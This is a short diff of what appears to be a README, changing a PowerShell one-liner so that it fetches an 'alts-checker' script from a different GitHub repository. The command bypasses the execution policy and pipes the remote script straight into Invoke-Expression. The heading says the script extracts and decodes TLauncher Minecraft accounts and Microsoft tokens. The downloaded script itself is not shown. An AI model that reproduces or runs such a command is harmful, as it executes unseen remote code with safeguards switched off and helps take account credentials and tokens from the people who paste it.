@@ -1,4 +1,4 @@
-- **powershell -Command "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass; Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/waaz1prod/alts-cheker/main/account-checker.ps1')"**
+- **powershell -Command "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass; Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/OnlyDehBest/alts-checker/main/alts-checker.ps1')"**
 
 🔐 **PowerShell Script to Extract and Decode TLauncher Minecraft Accounts with Microsoft Tokens**
 
